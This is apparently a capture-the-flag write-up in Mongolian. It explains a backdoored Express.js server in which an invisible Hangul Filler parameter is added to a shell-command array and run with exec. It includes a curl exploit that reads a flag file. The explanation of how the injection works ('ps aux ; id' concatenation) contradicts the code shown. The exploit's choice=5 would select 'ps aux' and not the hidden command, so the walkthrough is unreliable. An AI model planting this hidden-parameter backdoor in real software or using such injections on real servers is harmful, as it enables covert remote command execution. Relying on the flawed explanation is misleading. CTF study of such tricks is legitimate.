# Trinity's Hidden Door - Command injection in Hidden parameter

Код бичсэн хүн `req.body`-оос утга авахдаа ийм мөр бичсэн:
`const { choice, ㅤ } = req.body;`

Энэ нь "Хэрэглэгчийн илгээсэн өгөгдлөөс `choice` болон `ㅤ` гэсэн хоёр утгыг салгаж ав" гэсэн үг. `ㅤ` гэдэг нь харахад хоосон зай шиг боловч үнэндээ **Hangul Filler** гэдэг тусгай Unicode тэмдэгт. Халдагч энэ тэмдэгтээр дамжуулж дурын команд илгээх боломжтойг хөгжүүлэгч нууцаар үлдээсэн хэрэг.

```javascript
const express = require('express');
const path = require('path');
const util = require('util');
const exec = util.promisify(require('child_process').exec);

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

app.get('/', async (req, res) => {
    res.sendFile(path.join(__dirname, '/public/html/index.html'));
})

app.post('/server_status', async (req, res) => {
    const { choice,ㅤ} = req.body;
    const integerChoice = +choice;
    
    if (isNaN(integerChoice)) {
        return res.status(400).send('Invalid choice: must be a number');
    }

    const commands = [
        'free -m',
        'uptime',
        'iostat',
        'mpstat',
        'netstat',
        'ps aux',ㅤ
    ];

    if (integerChoice < 0 || integerChoice >= commands.length) {
        return res.status(400).send('Invalid choice: out of bounds');
    }

    exec(commands[integerChoice], (error, stdout) => {
        if (error) {
            return res.status(500).send('Error executing command');
        }

        res.status(200).send(stdout);
    });
});

app.listen(30011);
```

### 2. Команд яаж нэгдэж байна вэ?

Код дотор командуудыг ийм массив (жагсаалт) дотор хадгалсан байсан:

```javascript
const commands = [
    'free -m',
    'uptime',
    'iostat',
    'mpstat',
    'netstat',
    'ps aux', ㅤ // <-- Энд нөгөө нууц хувьсагч байна!
];
```

### Сэм залгах тактик (Semicolon `;`)

Linux/Unix системд `;` (цэгтэй таслал) бол "Эхний командыг ажиллуулаад, дуусангүүт нь дараагийн командыг ажиллуул" гэсэн тушаал юм.

- **Чиний илгээсэн утга:** `; id`
- **Сервер дээр үүссэн команд:** `ps aux ; id`
- **Үр дүн:** Сервер эхлээд ажиллаж байгаа процессуудыг харуулна (`ps aux`), дараа нь шууд чиний `id` командыг ажиллуулж хариуг нь буцаана.

### 4. Яагаад заавал URL Encode (`%E3%85%A4`) хэрэгтэй байв?

Веб серверүүд `ㅤ` гэх мэт тусгай тэмдэгтүүдийг шууд хүлээж авахдаа алдаа гаргадаг. Хэрэв чи шууд илгээвэл сервер үүнийг "хоосон зай" эсвэл "буруу тэмдэгт" гэж бодоод устгачихна.
Харин чи үүнийг UTF-8 стандартын дагуу `%E3%85%A4` гэж кодлоод илгээхэд сервер: "Аан, энэ бол нөгөө `ㅤ` тэмдэгт байна" гэж зөв таниад, чиний илгээсэн `; id`-г нөгөө нууц хувьсагчид оноож өгсөн юм.

```bash
┌──(root㉿kali)-[/home/zetr0/htb]
└─# curl -s http://139.59.230.119:10403/server_status \
  -d "choice=5" \
  --data-urlencode "%E3%85%A4=cat flag.txt" \
  -v
  
........................................
> POST /server_status HTTP/1.1
> Host: 139.59.230.119:10403
> User-Agent: curl/8.17.0
> Accept: */*
> Content-Length: 31
> Content-Type: application/x-www-form-urlencoded
....................................
< 
HZ2024{1nvi5IBl3_cH4r4cT3rS_n0t_sO_v1SIbL3_94b549e9c3c5d560}
```

[image]
